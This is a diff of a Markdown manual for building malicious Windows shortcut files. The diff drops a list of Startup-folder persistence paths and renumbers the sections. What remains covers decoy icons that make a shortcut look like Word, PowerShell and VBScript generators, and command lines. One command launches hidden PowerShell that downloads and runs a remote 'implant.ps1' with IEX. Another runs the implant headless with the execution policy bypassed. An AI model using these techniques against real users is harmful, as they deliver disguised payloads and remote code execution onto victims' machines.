@@ -1,31 +1,15 @@
 # Manual
 
-## 01 - Common Working Directories
-
-```
-%PUBLIC%
-C:\Users\Public
-%APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp
-C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
-%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\
-C:\ProgramData\Microsoft\Windows\Start Menu\Programs
-%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\StartUp
-C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
-%PROGRAMDATA%\Microsoft\Windows\Start Menu
-C:\ProgramData\Microsoft\Windows\Start Menu
-C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp
-```
-
-## 02 - Custom Icons
+## 01 - Custom Icons
 
 ```
 C:\Windows\System32\msi.dll
 C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.exe
 ```
 
-## 03 - Generate Shortcut
+## 02 - Generate Shortcut
 
-### 3.1 - Powershell
+### 2.1 - Powershell
 
 Note: The **TargetPath** has a limit of 260 characters long. If you're using powershell payload then it's recommended to use `psh-cmd` format instead of `psh`, `psh-reflection`, and `psh-net`.
 
@@ -56,7 +40,7 @@ $Shortcut.WorkingDirectory = "C:\Users\" + $Env:USERNAME + "\Public"
 $Shortcut.Save()
 ```
 
-### 3.2 - VBScript
+### 2.2 - VBScript
 
 ```vbscript
 Set ObjectWScript = WScript.CreateObject("WScript.Shell")
@@ -85,7 +69,7 @@ $ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\conhost.ex
 $ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\cmd.exe" "/c powershell.exe -nop -NonI -Nologo -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http[s]://<IP>:<PORT>/implant.ps1'))""" shortcut_file.lnk
 ```
 
-## 04 - Use Cases
+## 03 - Use Cases
 
 ```
 $ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\conhost.exe" "--headless powershell -ep bypass -f implant.ps1" shortcut_file.lnk
